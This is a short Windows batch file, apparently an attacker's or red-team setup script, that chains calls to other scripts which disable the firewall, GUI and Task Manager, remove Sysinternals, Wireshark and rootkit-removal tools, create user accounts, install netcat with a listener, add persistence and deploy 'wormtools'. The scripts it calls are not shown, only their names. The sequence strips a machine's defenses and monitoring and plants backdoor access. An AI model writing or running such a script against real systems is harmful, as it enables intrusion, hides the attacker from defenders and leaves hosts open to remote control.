@echo off
::setup scripting for AD tools

call disableGUI.bat
call removeSYSinternals.bat
call disableGUI.bat
call disablefirewall.bat
call createusers.bat
call removewireshark.bat
call wormtools.bat
call removerkillers.bat
call addnetcat.bat
call PersistenceScript.bat
call netcatlistener.bat
call removeTaskManager.bat


